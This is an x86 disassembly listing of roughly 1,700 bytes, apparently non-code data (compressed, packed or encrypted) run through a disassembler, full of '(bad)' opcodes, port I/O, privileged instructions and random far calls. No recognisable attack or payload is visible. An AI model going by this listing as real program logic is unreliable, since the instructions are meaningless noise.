  477f68:	fld    DWORD PTR [eax-0x62]
  477f6b:	sahf   
  477f6c:	adc    ch,0xf
  477f6f:	xlat   BYTE PTR ds:[ebx]
  477f70:	in     al,dx
  477f71:	mov    eax,ds:0xf3cf65a
  477f76:	loop   0x477f4d
  477f78:	je     0x477f83
  477f7a:	es mov bh,0x96
  477f7d:	or     dh,BYTE PTR [eax]
  477f7f:	cmp    DWORD PTR [ebx+0x7],0xffffffef
  477f83:	int    0x8e
  477f85:	cmp    al,0xcb
  477f87:	cmp    dh,BYTE PTR [ebp-0xf]
  477f8a:	and    BYTE PTR [esp+edi*1],al
  477f8d:	nop
  477f8e:	out    0x92,al
  477f90:	xchg   ebx,eax
  477f91:	aad    0x57
  477f93:	push   edi
  477f94:	fs jns 0x477fdd
  477f97:	push   es
  477f98:	mov    ecx,0x5757415f
  477f9d:	imul   ebx,DWORD PTR [esi+0x13620191],0x6eadf462
  477fa7:	nop
  477fa8:	or     esp,DWORD PTR [ebx-0x1a]
  477fab:	or     eax,0xf9a89714
  477fb0:	(bad)  
  477fb1:	mul    eax
  477fb3:	lea    ecx,[ecx-0x40]
  477fb6:	and    DWORD PTR es:[eax+0x2b379b1],edi
  477fbd:	sbb    BYTE PTR [eax+0x7fed9b1f],ch
  477fc3:	add    DWORD PTR [esi],0x6d6006c1
  477fc9:	les    edi,FWORD PTR [ecx+ebp*8-0x41df0e75]
  477fd0:	dec    ecx
  477fd1:	inc    eax
  477fd2:	cli    
  477fd3:	mov    ebx,0x793c0fbf
  477fd8:	ret    0xf02c
  477fdb:	ret    0x5ce
  477fde:	fnstcw WORD PTR [ebp-0x22]
  477fe1:	pop    ds
  477fe2:	lock std 
  477fe4:	jg     0x478055
  477fe6:	mul    BYTE PTR [edx]
  477fe8:	fcomp  QWORD PTR [edx+0x458048c]
  477fee:	test   ebp,ecx
  477ff0:	dec    eax
  477ff1:	pop    esi
  477ff2:	inc    ecx
  477ff3:	push   es
  477ff4:	rcr    DWORD PTR [esi-0x7cdf7299],0x43
  477ffb:	or     eax,0x2e0c82b2
  478000:	in     al,dx
  478001:	imul   edi,DWORD PTR [edx+esi*2-0x4e],0x39
  478006:	nop
  478007:	mov    al,ds:0xb2946bb7
  47800c:	push   0x5c00f556
  478011:	out    dx,al
  478012:	jns    0x478035
  478014:	dec    edi
  478015:	ss iret 
  478017:	fcomp  DWORD PTR [esi+0x733ac437]
  47801d:	add    dl,BYTE PTR [ebx-0x2d7ec179]
  478023:	xchg   ebx,eax
  478024:	sub    DWORD PTR [ebx-0x80],ecx
  478027:	push   ecx
  478028:	or     eax,0xc737271
  47802d:	sub    bh,BYTE PTR [edx+ecx*2]
  478030:	shr    BYTE PTR [esi+0x16],0x3
  478034:	push   ss
  478035:	nop
  478036:	adc    DWORD PTR [edi-0x64e32a29],0x15
  47803d:	xor    BYTE PTR [eax],ah
  47803f:	pop    esp
  478040:	sbb    eax,0x42172463
  478045:	jbe    0x478058
  478047:	aad    0x1d
  478049:	xchg   esi,eax
  47804a:	f2xm1  
  47804c:	dec    eax
  47804d:	mov    fs,esp
  47804f:	adc    eax,0x2311f0d9
  478054:	adc    DWORD PTR [edx+0x1b7c1181],esi
  47805a:	aam    0x30
  47805c:	test   BYTE PTR [eax],al
  47805e:	or     eax,0x52fc6e46
  478063:	adc    DWORD PTR [eax-0x2c8adead],0xe1646654
  47806d:	pop    ecx
  47806e:	dec    edx
  47806f:	inc    edi
  478070:	aad    0xde
  478072:	dec    edi
  478073:	rol    DWORD PTR [ebp+0xf62033c],cl
  478079:	add    BYTE PTR [esi+0x3d85d947],bl
  47807f:	in     al,0x9e
  478081:	inc    edi
  478082:	enter  0xf4b,0x26
  478086:	pop    ds
  478087:	daa    
  478088:	nop
  478089:	cmp    BYTE PTR [edi],cl
  47808b:	sahf   
  47808c:	lock aad 0x29
  47808f:	sahf   
  478090:	inc    edi
  478091:	and    eax,0xee25e407
  478096:	inc    edi
  478097:	f2xm1  
  478099:	cmp    edi,DWORD PTR [ebx+0x9]
  47809c:	jns    0x478077
  47809e:	lock push cs
  4780a0:	mov    bl,0x78
  4780a2:	or     esp,0x3718903c
  4780a8:	pop    es
  4780a9:	xlat   BYTE PTR ds:[ebx]
  4780aa:	dec    esp
  4780ab:	and    edx,esp
  4780ad:	popf   
  4780ae:	sub    edi,DWORD PTR [ecx+0x2a9bf18d]
  4780b4:	test   BYTE PTR [ecx],ch
  4780b6:	inc    edx
  4780b7:	sub    DWORD PTR [edx-0x4d],esp
  4780ba:	inc    edi
  4780bb:	jno    0x4780c2
  4780bd:	jb     0x4780a1
  4780bf:	inc    esp
  4780c0:	pop    ebx
  4780c1:	dec    edi
  4780c2:	sbb    ah,BYTE PTR [edx]
  4780c4:	mov    DWORD PTR [esi],eax
  4780c6:	or     cl,al
  4780c8:	sbb    DWORD PTR [esi+0x9141b21],esp
  4780ce:	cmp    eax,0x24b11c40
  4780d3:	mov    fs,esp
  4780d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4780d6:	cmp    edi,DWORD PTR [eax]
  4780d8:	and    cl,BYTE PTR [ecx]
  4780da:	in     al,0x84
  4780dc:	cmp    al,0x12
  4780de:	icebp  
  4780df:	cli    
  4780e0:	ror    BYTE PTR [ebx],0x89
  4780e3:	addr16 xchg ebx,eax
  4780e5:	or     cl,BYTE PTR [esi-0x6]
  4780e8:	mov    al,ds:0x2f606f14
  4780ed:	leave  
  4780ee:	cli    
  4780ef:	mov    al,ds:0x335d0f3e
  4780f4:	sbb    dh,dl
  4780f6:	ins    BYTE PTR es:[edi],dx
  4780f7:	adc    al,0x60
  4780f9:	jl     0x478134
  4780fb:	xchg   ebx,eax
  4780fc:	xchg   ecx,eax
  4780fd:	pop    ebp
  4780fe:	inc    ebx
  4780ff:	shl    BYTE PTR [esi-0x7099a356],1
  478105:	cdq    
  478106:	adc    BYTE PTR [esp+ebx*2-0x4ce462e7],al
  47810d:	sbb    esp,DWORD PTR [esi-0x7e]
  478110:	push   ds
  478111:	mov    bl,0x9e
  478113:	pop    ebp
  478114:	nop
  478115:	sub    eax,0x51da9091
  47811a:	imul   ecx,DWORD PTR [edi],0x3d81b2ed
  478120:	inc    edi
  478121:	imul   eax,DWORD PTR [eax+0x23],0x43
  478125:	test   DWORD PTR [esi+0x21],edx
  478128:	mov    ecx,0x4a91a166
  47812d:	fcomp  DWORD PTR [ebx]
  47812f:	mov    dl,0x0
  478131:	inc    edi
  478132:	rol    WORD PTR [edi+0x2f],cl
  478136:	leave  
  478137:	inc    edx
  478138:	add    ecx,DWORD PTR [esi+0x76]
  47813b:	push   ds
  47813c:	call   0x955fa7a
  478141:	jbe    0x4780c3
  478143:	add    bl,bl
  478145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  478146:	sbb    al,0xde
  478148:	cmp    ebx,DWORD PTR [ebp+0x4f726606]
  47814e:	xchg   BYTE PTR [eax-0x35],dh
  478151:	shl    DWORD PTR [esp+eax*4],cl
  478154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  478155:	sbb    bl,0x1e
  478158:	jmp    0x478150
  47815a:	lock mov ecx,0x3a3b844b
  478160:	dec    ecx
  478161:	sub    DWORD PTR ds:[ebx+edi*1-0x48],eax
  478166:	fild   QWORD PTR [edx+eiz*4-0x18bfd271]
  47816d:	add    BYTE PTR [esi],ah
  47816f:	inc    eax
  478170:	inc    esi
  478171:	cs dec edx
  478173:	popf   
  478174:	adc    al,BYTE PTR [edx]
  478176:	sub    BYTE PTR [ecx],0x42
  478179:	mov    cs,WORD PTR [edx-0x80]
  47817c:	pop    es
  47817d:	out    0x83,eax
  47817f:	outs   dx,DWORD PTR ds:[esi]
  478180:	add    bl,bl
  478182:	mov    esi,DWORD PTR [esi-0x19e127c4]
  478188:	nop
  478189:	sub    ebx,DWORD PTR [ebx]
  47818b:	dec    eax
  47818c:	(bad)  
  47818d:	imul   ebx,DWORD PTR [ebx-0x6fea73d6],0x1b4ff194
  478197:	sbb    BYTE PTR [ecx+eax*2-0x1f7823e8],cl
  47819e:	or     eax,0x9c903b88
  4781a3:	in     al,0x24
  4781a5:	cli    
  4781a6:	loopne 0x4781a2
  4781a8:	loopne 0x478164
  4781aa:	test   BYTE PTR [ebp+0xee0fae4],bl
  4781b0:	cmp    ecx,DWORD PTR [edi]
  4781b2:	jne    0x47818d
  4781b4:	mov    al,0xf3
  4781b6:	inc    ebp
  4781b7:	in     al,0x5e
  4781b9:	rol    BYTE PTR [edx],0x1c
  4781bc:	adc    ah,BYTE PTR [esi+0x4]
  4781bf:	fmul   QWORD PTR [eax+0x7]
  4781c2:	sti    
  4781c3:	xor    al,BYTE PTR ds:0xb02c622b
  4781c9:	push   ebx
  4781ca:	in     eax,0x60
  4781cc:	or     BYTE PTR [ebx-0x40c2ea20],ah
  4781d2:	ins    BYTE PTR es:[edi],dx
  4781d3:	xor    BYTE PTR [edi],dh
  4781d5:	test   eax,0x1c365d9e
  4781da:	dec    ebp
  4781db:	pop    ecx
  4781dc:	add    al,0x1b
  4781de:	lds    ebp,FWORD PTR [esi+0x14783544]
  4781e4:	mov    esp,0x1b9c95a7
  4781e9:	dec    edi
  4781ea:	in     al,0x4a
  4781ec:	js     0x4781f8
  4781ee:	xchg   edi,eax
  4781ef:	repz jae 0x47824e
  4781f2:	mov    al,0x17
  4781f4:	adc    al,BYTE PTR [esi+0x21446f5c]
  4781fa:	sub    bl,BYTE PTR [eax-0x13c2cfff]
  478200:	adc    BYTE PTR [esi+0x49],bh
  478203:	dec    ebx
  478204:	pusha  
  478205:	xchg   edx,eax
  478206:	out    0x44,al
  478208:	bound  ebx,QWORD PTR [edi]
  47820a:	and    DWORD PTR fs:[eax],ecx
  47820d:	sub    DWORD PTR [ebp+0x45],ebx
  478210:	inc    eax
  478211:	aam    0x90
  478213:	and    edi,DWORD PTR [ecx+0x18e54040]
  478219:	mov    al,0xec
  47821b:	dec    esp
  47821c:	or     eax,0x8040fa5e
  478221:	xor    eax,0xca2eceab
  478226:	mov    ecx,0x85ec2ce9
  47822b:	in     al,0x1b
  47822d:	xor    edx,DWORD PTR [eax]
  47822f:	int3   
  478230:	mov    ebx,0x91065892
  478235:	jl     0x4781e3
  478237:	pop    eax
  478238:	or     al,0x48
  47823a:	push   es
  47823b:	xor    eax,0x428f219b
  478241:	xchg   dl,al
  478243:	or     ebp,ecx
  478245:	in     al,0x8
  478247:	hlt    
  478248:	add    bl,bl
  47824a:	cmp    edx,0xd1c3640
  478250:	mov    ebp,0xbd5d2b14
  478255:	fst    DWORD PTR [ecx-0x4ebd1b2f]
  47825b:	jns    0x47829d
  47825d:	cmp    ch,BYTE PTR [ebx]
  47825f:	add    eax,0xc8472bb9
  478264:	xlat   BYTE PTR ds:[ebx]
  478265:	sbb    eax,0xc41dfa48
  47826a:	daa    
  47826b:	cmp    al,BYTE PTR [edx]
  47826d:	jb     0x4782d0
  47826f:	xchg   ebx,eax
  478270:	cmp    al,0xca
  478272:	mov    ah,0x4f
  478274:	aas    
  478275:	inc    edi
  478276:	enter  0x1764,0x43
  47827a:	daa    
  47827b:	xor    eax,0x93309202
  478280:	cmp    al,0xc5
  478282:	mov    bh,0x2c
  478284:	repnz and BYTE PTR [eax+0x1],al
  478288:	inc    esp
  478289:	pop    es
  47828a:	sahf   
  47828b:	aad    0xf1
  47828d:	inc    esi
  47828e:	and    al,0x4f
  478290:	ds sahf 
  478292:	aad    0x48
  478294:	pusha  
  478295:	outs   dx,DWORD PTR ds:[esi]
  478296:	jb     0x4782ef
  478298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  478299:	cmp    edi,DWORD PTR [esi-0x2b]
  47829c:	dec    ebp
  47829d:	pop    edi
  47829e:	pop    esi
  47829f:	fisubr WORD PTR [edx]
  4782a1:	fidivr WORD PTR [ebx+0x14]
  4782a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4782a5:	mov    ebx,0x9efbd59e
  4782aa:	aad    0x2
  4782ac:	hlt    
  4782ad:	push   edi
  4782ae:	jle    0x47832b
  4782b0:	mov    esi,0xf75b0dd5
  4782b5:	call   0x9c56:0xc2b40244
  4782bc:	inc    esp
  4782bd:	in     al,0x80
  4782bf:	sub    al,0x14
  4782c1:	pushf  
  4782c2:	pop    esi
  4782c3:	lahf   
  4782c4:	add    DWORD PTR [eax],0x44eac99d
  4782ca:	jnp    0x47826a
  4782cc:	dec    eax
  4782cd:	and    bh,0x9a
  4782d0:	aad    0x73
  4782d2:	sbb    cl,BYTE PTR [ebx]
  4782d4:	dec    esp
  4782d5:	jne    0x47832f
  4782d7:	enter  0x7b23,0x9e
  4782db:	inc    esp
  4782dc:	test   DWORD PTR [ebp+0x6bb52411],edi
  4782e2:	jl     0x4782d8
  4782e4:	push   esi
  4782e5:	nop
  4782e6:	aam    0x5e
  4782e8:	mov    ch,0x6b
  4782ea:	test   DWORD PTR ds:0x72440204,esi
  4782f0:	xor    BYTE PTR [ecx],ah
  4782f2:	cmovb  ecx,DWORD PTR [esi+0x38]
  4782f6:	jns    0x478292
  4782f8:	and    eax,0xbd0091e5
  4782fd:	or     DWORD PTR [esi+edx*1+0x6b],eax
  478301:	in     al,0x1
  478303:	add    DWORD PTR [edx+0x19],edi
  478306:	inc    esp
  478307:	call   0xf20e:0x4b7bd506
  47830e:	cmp    al,0x7b
  478310:	xor    al,0x39
  478312:	and    BYTE PTR [ebx],bl
  478314:	push   ss
  478315:	repnz add esi,DWORD PTR [esp+eax*2]
  478319:	call   0xd9ac:0x3402d5c5
  478320:	and    ebp,esp
  478322:	aaa    
  478323:	sbb    al,0x44
  478325:	fnstcw WORD PTR [ebx+0x21]
  478328:	cmp    DWORD PTR [eax+0x39],esp
  47832b:	and    eax,0x68040a78
  478330:	aaa    
  478331:	cmp    esp,ebx
  478333:	out    0x4,al
  478335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  478336:	aad    0x44
  478338:	sbb    dh,0x9b
  47833b:	or     eax,0x20a2a0f
  478340:	in     al,0x1
  478342:	dec    edx
  478343:	inc    esp
  478344:	jnp    0x4783c4
  478346:	aad    0x48
  478348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  478349:	in     al,dx
  47834a:	xchg   esp,eax
  47834b:	fsubp  st(0),st
  47834d:	lea    eax,[edx]
  47834f:	leave  
  478350:	xchg   esp,eax
  478351:	sbb    eax,0xd62ee0c4
  478356:	ins    BYTE PTR es:[edi],dx
  478357:	add    DWORD PTR [edx-0x80],eax
  47835a:	inc    esp
  47835b:	and    BYTE PTR ds:0x85e486c9,0x26
  478362:	mov    ebx,0x7c871fee
  478367:	and    al,0x40
  478369:	inc    esp
  47836a:	call   0x1f25:0x6cead5a5
  478371:	enter  0xd5a5,0xdd
  478375:	out    dx,al
  478376:	aad    0x17
  478378:	ins    BYTE PTR es:[edi],dx
  478379:	mov    esp,0x12488e77
  47837e:	dec    ebx
  47837f:	jns    0x478334
  478381:	ins    BYTE PTR es:[edi],dx
  478382:	mov    esp,0x17858c81
  478387:	cmp    BYTE PTR [edi],cl
  478389:	call   0xeedee84b
  47838e:	setg   BYTE PTR [edx]
  478391:	mov    ecx,0x44042079
  478396:	call   0x2fd5:0x859ad565
  47839d:	add    DWORD PTR [edx+0x21],edi
  4783a0:	sbb    DWORD PTR [eax+ebx*1-0x17],eax
  4783a4:	push   ecx
  4783a5:	enter  0x2013,0x9a
  4783a9:	out    dx,al
  4783aa:	aad    0x54
  4783ac:	enter  0x7591,0x9b
  4783b0:	pop    esi
  4783b1:	sbb    BYTE PTR [esi],0xf2
  4783b4:	and    ah,ah
  4783b6:	js     0x4783e1
  4783b8:	cld    
  4783b9:	jle    0x4783b7
  4783bb:	jle    0x47838d
  4783bd:	mov    ebp,0xd16042f2
  4783c2:	adc    al,0x4
  4783c4:	push   esi
  4783c5:	push   ss
  4783c6:	mov    esp,0xd9919347
  4783cb:	repz smsw WORD PTR [eax-0x2e]
  4783d0:	sub    eax,0xe32f0f5b
  4783d5:	arpl   si,si
  4783d7:	mov    edx,0x312b01b0
  4783dc:	push   ss
  4783dd:	inc    ecx
  4783de:	and    BYTE PTR [edi],cl
  4783e0:	stc    
  4783e1:	cmp    al,0xd
  4783e3:	push   esi
  4783e4:	mov    cl,ah
  4783e6:	xor    dl,bl
  4783e8:	out    dx,eax
  4783e9:	pop    esp
  4783ea:	leave  
  4783eb:	ja     0x4783f5
  4783ed:	pop    ss
  4783ee:	(bad)  
  4783ef:	mov    DWORD PTR [edx],edx
  4783f1:	(bad)  
  4783f2:	enter  0x66e6,0x4
  4783f6:	push   eax
  4783f7:	xchg   ecx,eax
  4783f8:	jns    0x478430
  4783fa:	inc    esi
  4783fb:	cmp    BYTE PTR [edi+0x44d25d19],0x12
  478402:	pop    ebx
  478403:	jp     0x47846e
  478405:	sbb    al,0x8f
  478407:	push   ecx
  478408:	adc    dl,BYTE PTR [edi+eiz*1]
  47840b:	jmp    0x1d656b
  478410:	pop    ebx
  478411:	les    esp,FWORD PTR [ebx]
  478413:	in     eax,0x9d
  478415:	mov    esi,ecx
  478417:	pushf  
  478418:	imul   eax,ebp,0x60bce0dc
  47841e:	pop    ds
  47841f:	clc    
  478420:	ja     0x47841b
  478422:	mov    ebp,0xe1e7b921
  478427:	shl    BYTE PTR [edx-0x6e],1
  47842a:	adc    ch,BYTE PTR [eax]
  47842c:	mov    bh,BYTE PTR [ebx]
  47842e:	hlt    
  47842f:	in     al,dx
  478430:	scas   eax,DWORD PTR es:[edi]
  478431:	test   al,0xdf
  478433:	add    BYTE PTR [ebx],cl
  478435:	loope  0x478453
  478437:	mov    ah,dl
  478439:	loop   0x47847c
  47843b:	and    DWORD PTR [eax],ebp
  47843d:	xor    BYTE PTR [edi-0x64],cl
  478440:	in     eax,dx
  478441:	lods   eax,DWORD PTR ds:[esi]
  478442:	fst    QWORD PTR [esi+ebp*4]
  478445:	mov    esi,0x4ef146b
  47844a:	pop    ss
  47844b:	aad    0xfe
  47844d:	ins    DWORD PTR es:[edi],dx
  47844e:	adc    al,0xc1
  478450:	or     eax,0xe58540b3
  478455:	sub    DWORD PTR [eax-0x75],edi
  478458:	jbe    0x478415
  47845a:	jge    0x47843d
  47845c:	lods   al,BYTE PTR ds:[esi]
  47845d:	and    DWORD PTR [eax],edi
  47845f:	mov    cl,0x2e
  478461:	adc    DWORD PTR [edx],eax
  478463:	push   es
  478464:	xor    BYTE PTR [ebp+0x70002d2c],dh
  47846a:	pop    ebp
  47846b:	or     ecx,ebx
  47846d:	add    al,0x40
  47846f:	fcomp  DWORD PTR [ebx+0xb]
  478472:	(bad)  
  478473:	stos   DWORD PTR es:[edi],eax
  478474:	ds jnp 0x478480
  478477:	adc    DWORD PTR [ebx+0x1d80c0ba],edx
  47847d:	jbe    0x478448
  47847f:	add    al,0x51
  478481:	inc    ebp
  478482:	icebp  
  478483:	je     0x478432
  478485:	sub    BYTE PTR ds:0xc997f3c9,0x9c
  47848c:	push   ss
  47848d:	scas   al,BYTE PTR es:[edi]
  47848e:	std    
  47848f:	mov    edi,0xd1d91188
  478494:	xchg   ecx,eax
  478495:	ins    BYTE PTR es:[edi],dx
  478496:	push   ss
  478497:	pusha  
  478498:	lods   eax,DWORD PTR ds:[esi]
  478499:	hlt    
  47849a:	test   BYTE PTR [ebp+esi*1-0x48],dl
  47849e:	(bad)  
  4784a0:	pop    ss
  4784a1:	add    al,0x8b
  4784a3:	mov    cl,BYTE PTR [edi+0x79067599]
  4784a9:	adc    bh,BYTE PTR [edx+0x55a9bdb1]
  4784af:	mul    cl
  4784b1:	into   
  4784b2:	fcomp  QWORD PTR [ecx-0x77]
  4784b5:	iret   
  4784b6:	mov    cl,dh
  4784b8:	in     eax,dx
  4784b9:	out    0x7e,al
  4784bb:	mov    ah,BYTE PTR [ebx]
  4784bd:	sbb    ebp,DWORD PTR [eax]
  4784bf:	iret   
  4784c0:	jns    0x4784a5
  4784c2:	les    edx,FWORD PTR [esi+eiz*2]
  4784c5:	dec    ebx
  4784c6:	xor    dl,BYTE PTR [esi-0x18]
  4784c9:	xor    al,0xf1
  4784cb:	dec    ecx
  4784cc:	bound  esp,QWORD PTR [edi+0x4]
  4784cf:	sub    ebp,DWORD PTR ds:0x5be13b39
  4784d5:	push   cs
  4784d6:	dec    edi
  4784d7:	sub    BYTE PTR [edi-0x23],dl
  4784da:	mov    ?,WORD PTR [esp+eax*4-0x70]
  4784de:	rcl    BYTE PTR [ecx+0x60326bed],1
  4784e4:	pop    ebx
  4784e5:	mov    ch,0xd0
  4784e7:	dec    ebp
  4784e8:	out    0xde,eax
  4784ea:	inc    eax
  4784eb:	pusha  
  4784ec:	cld    
  4784ed:	hlt    
  4784ee:	push   0x991b0a6b
  4784f3:	jle    0x478560
  4784f5:	loop   0x4784d7
  4784f7:	mov    al,ds:0x466ebc02
  4784fc:	xchg   DWORD PTR [edx-0x5a],eax
  4784ff:	enter  0xb3c9,0xfc
  478503:	adc    al,0xad
  478505:	and    BYTE PTR [ecx],bh
  478507:	and    al,0xfc
  478509:	add    al,0x82
  47850b:	sub    al,0x2e
  47850d:	in     al,dx
  47850e:	imul   edi,DWORD PTR [ebx+esi*8-0x37],0x4e
  478513:	xchg   ecx,eax
  478514:	mov    al,0xb7
  478516:	imul   edi,DWORD PTR [esi+edi*8-0x6e],0xffffffc9
  47851b:	push   ds
  47851c:	sbb    eax,0x40fdf0f
  478521:	imul   ebp,ecx,0xa3f31931
  478527:	and    dh,ch
  478529:	es cmp eax,0x60a37aac
  47852f:	cmp    esp,DWORD PTR [ecx]
  478531:	stc    
  478532:	dec    esi
  478533:	(bad)  
  478534:	call   0xc0598c92
  478539:	leave  
  47853a:	or     ebx,ebp
  47853c:	smsw   WORD PTR [eax+edx*1]
  478540:	adc    DWORD PTR [edx+0x7920681c],0x14
  478547:	jb     0x47855c
  478549:	in     eax,dx
  47854a:	or     eax,DWORD PTR [edx+eiz*8]
  47854d:	test   BYTE PTR [ebx+eax*2],bh
  478550:	cmp    eax,DWORD PTR [ebp+0x24f5402]
  478556:	icebp  
  478557:	psrlw  mm3,mm0
  47855a:	fisubr WORD PTR [ecx+0x16]
  47855d:	push   edx
  47855e:	adc    dl,BYTE PTR [ecx]
  478560:	ret    
  478561:	aad    0xa2
  478563:	dec    ebp
  478564:	push   es
  478565:	sub    eax,0x1e5ecfde
  47856a:	sbb    DWORD PTR [edi-0x38],ebp
  47856d:	add    eax,0xab3110f
  478572:	pop    edi
  478573:	leave  
  478574:	and    DWORD PTR [ecx+0x4],edi
  478577:	adc    DWORD PTR [ebx+0x1025c311],esi
  47857d:	outs   dx,DWORD PTR ds:[esi]
  47857e:	add    eax,0x31910f6b
  478583:	push   ecx
  478584:	xor    cl,ch
  478586:	data16 or BYTE PTR [edx],cl
  478589:	in     al,0x54
  47858b:	enter  0x703,0xba
  47858f:	cs push ebp
  478591:	xor    eax,ebp
  478593:	outs   dx,BYTE PTR ds:[esi]
  478594:	add    BYTE PTR [ebx+0x11],ch
  478597:	mov    ds:0x43688dc8,eax
  47859c:	or     dl,BYTE PTR [edx]
  47859e:	fnstcw WORD PTR [ebx+0x42]
  4785a1:	sahf   
  4785a2:	add    eax,0x11cc0f6f
  4785a7:	mov    ds:0xf208a614,eax
  4785ac:	adc    DWORD PTR [ebx-0x4f649384],esp
  4785b2:	sbb    edx,DWORD PTR [edx+0x6b157b59]
  4785b8:	daa    
  4785b9:	lahf   
  4785ba:	adc    eax,edx
  4785bc:	pop    ebx
  4785bd:	popa   
  4785be:	les    ebp,FWORD PTR [edx]
  4785c0:	sbb    al,0x41
  4785c2:	dec    eax
  4785c3:	pop    esi
  4785c4:	add    al,cl
  4785c6:	(bad)  
  4785c7:	loope  0x4785e9
  4785c9:	add    BYTE PTR ds:0x27fdb4d,bh
  4785cf:	scas   eax,DWORD PTR es:[edi]
  4785d0:	push   0xe
  4785d2:	sbb    BYTE PTR [ecx],dh
  4785d4:	pushf  
  4785d5:	sub    eax,0x42dce179
  4785da:	rol    BYTE PTR [edx+0x0],0x99
  4785de:	jb     0x4785b4
  4785e0:	dec    esi
  4785e1:	jno    0x47861b
  4785e3:	ss loope 0x478629
  4785e6:	mov    edi,0x988cdd34
  4785eb:	add    BYTE PTR [eax+esi*1+0x1d],bl
  4785ef:	push   ss
  4785f0:	or     esp,eax
  4785f2:	pop    eax
  4785f3:	add    bh,bl
  4785f5:	inc    ebp
  4785f6:	(bad)  
  4785f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4785f9:	pusha  
  4785fa:	push   esi
  4785fb:	add    BYTE PTR [ebp+0x55],0xad
  4785ff:	xor    BYTE PTR [edi-0x37],0x38
  478603:	jnp    0x478660
  478605:	push   cs
  478606:	inc    DWORD PTR [ebx-0x4a]
  478609:	mov    cl,0x91
  47860b:	jmp    0x2de2f471
  478610:	fwait
  478611:	pop    es
  478612:	jns    0x478652
  478614:	nop
  478615:	lods   eax,DWORD PTR ds:[esi]
  478616:	fwait
  478617:	xchg   ebx,eax
  478618:	lods   eax,DWORD PTR ds:[esi]
  478619:	test   eax,0xc85cf14e
  47861e:	cmp    BYTE PTR [ebx+ebx*8],0x17
  478622:	pop    ss
  478623:	push   es
  478624:	sbb    DWORD PTR [ebx],ebp
  478626:	clc    
  478627:	mov    gs,ecx
  478629:	push   esp
  47862a:	sub    bl,BYTE PTR [esi]
  47862c:	jl     0x47865c
  47862e:	shl    BYTE PTR fs:[eax],0x66
  478632:	xchg   di,ax
  478634:	jmp    0x1aac24d
  478639:	cmp    esi,DWORD PTR [ebx]
  47863b:	push   ds
  47863c:	or     al,0x58
  47863e:	nop
  47863f:	(bad)  
  478640:	fstp   QWORD PTR [esi]
  478642:	xchg   ebx,eax
  478643:	adc    DWORD PTR [ebx-0x6c6f2490],edx
  478649:	iret   
  47864a:	test   ebx,ebx
  47864c:	pop    ebx
  47864d:	stc    
  47864e:	aaa    
  47864f:	leave  
  478650:	out    0x42,eax
  478652:	push   cs
  478653:	stos   DWORD PTR es:[edi],eax
  478654:	stos   DWORD PTR es:[edi],eax
  478655:	test   al,0xf9
  478657:	sbb    DWORD PTR [eax+0x2e],eax
  47865a:	in     al,0x4c
  47865c:	add    al,BYTE PTR [ebx-0x61be37d5]
  478662:	or     ebp,DWORD PTR [ebx]
  478664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478665:	dec    eax
  478666:	add    cl,al
  478668:	jae    0x47868b
  47866a:	add    edi,DWORD PTR [esp+edi*4+0x4321bcb5]
  478671:	xor    bl,BYTE PTR [ecx]
  478673:	jae    0x478661
  478675:	(bad)  
  478676:	sbb    eax,DWORD PTR [ecx+0x16]
  478679:	adc    eax,0x10326e6b
  47867e:	pop    ecx
  47867f:	pop    ss
  478680:	sub    ebx,0xffffff83
  478683:	enter  0x2440,0x47
  478687:	jae    0x4786fc
  478689:	call   0x69a78652
  47868e:	inc    esi
  47868f:	(bad)  [edi+0x46]
  478692:	fsubr  st(5),st
  478694:	pusha  
  478695:	inc    esi
  478696:	pushf  
  478697:	and    DWORD PTR [ecx],edi
  478699:	std    
  47869a:	sbb    al,BYTE PTR [eax]
  47869c:	sbb    BYTE PTR [eax+edx*1+0x11],ah
  4786a0:	fcomp  QWORD PTR [ebx+ecx*1-0x47]
  4786a4:	pop    edx
  4786a5:	xor    ebx,DWORD PTR [eax+0x60]
  4786a8:	sbb    ebp,ecx
  4786aa:	sbb    DWORD PTR [ecx+0x3],eax
  4786ad:	and    al,0xc5
  4786af:	mov    ch,BYTE PTR [eax+eax*2-0x24]
  4786b3:	jns    0x4786c9
  4786b5:	xor    ah,BYTE PTR [esi+eiz*2-0xe]
  4786b9:	pop    eax
  4786ba:	pop    edx
  4786bb:	adc    esi,DWORD PTR [edx+0x1bfd209c]
  4786c1:	icebp  
  4786c2:	add    bl,BYTE PTR [esi+0x4221a0b2]
  4786c8:	adc    DWORD PTR [edx-0x2b],ecx
  4786cb:	cmc    
  4786cc:	in     al,dx
  4786cd:	sbb    al,0x40
  4786cf:	cmp    edx,DWORD PTR [edx]
  4786d1:	dec    esi
  4786d2:	adc    DWORD PTR [edx],edi
  4786d4:	jnp    0x478719
  4786d6:	dec    esi
  4786d7:	sbb    BYTE PTR ds:0xf3e3a11,ah
  4786dd:	pop    eax
  4786de:	jae    0x4786e2
  4786e0:	add    ecx,DWORD PTR [edx-0x5dc659d6]
  4786e6:	ret    0x60b1
  4786e9:	mov    DWORD PTR [ecx],ecx
  4786eb:	inc    esp
  4786ec:	dec    eax
  4786ed:	or     ebx,DWORD PTR [ecx]
  4786ef:	mov    al,0xdf
  4786f1:	xor    edx,ecx
  4786f3:	imul   esi,DWORD PTR [edi+0x6b],0xffffff97
  4786f7:	and    eax,0xdbdee9bb
  4786fc:	nop
  4786fd:	imul   eax,DWORD PTR [ecx],0x22936bf1
  478703:	jge    0x4786e4
  478705:	adc    dh,BYTE PTR [esi-0x6e]
  478708:	and    edi,ebx
  47870a:	icebp  
  47870b:	dec    ebx
  47870c:	rdmsr  
  47870e:	cwde   
  47870f:	sti    
  478710:	cmp    DWORD PTR [edi],ecx
  478712:	or     al,0x5b
  478714:	ss mov esp,0x77b62a2b
  47871a:	ret    0x5c4e
  47871d:	sbb    ecx,DWORD PTR [edi]
  47871f:	jae    0x478712
  478721:	or     al,0x2b
  478723:	lock mov ds:0x8b6e1209,al
  478729:	retf   
  47872a:	cmp    al,0xe5
  47872c:	out    dx,al
  47872d:	cmp    esp,0x15
  478730:	popa   
  478731:	or     dl,al
  478733:	adc    DWORD PTR [ebx-0x2b],eax
  478736:	adc    esi,esi
  478738:	or     al,0xc
